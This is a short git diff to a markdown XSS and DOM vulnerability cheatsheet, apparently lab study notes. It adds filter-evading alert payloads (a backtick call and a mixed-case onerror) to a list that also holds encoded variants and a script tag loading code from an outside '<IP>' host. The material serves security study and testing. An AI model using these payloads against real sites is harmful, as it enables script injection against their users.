@@ -1,4 +1,4 @@
-# XSS && DOM vulnerabilities - CHEATSHEET + LABS
+# XSS && DOM vulnerabilities - CHEATSHEET + MOST IMPORTANT LABS
 
 ## Index
 - [XSS \&\& DOM vulnerabilities - CHEATSHEET + LABS](#xss--dom-vulnerabilities---cheatsheet--labs)
@@ -56,6 +56,8 @@ Repeat the same procedure with the target victim
 ```js
 <script>alert(1)</script>
 <img src=0 onerror=alert(0)>
+<img src=0 onerror=alert`0`>
+<img src=0 oNeRrOr=alert(0)>
 <img src=x onerror="&#x61;lert(1)">
 <img src=x onerror="#00000000000058;alert(1)">
 <script src="http://<IP>/foo"></script>
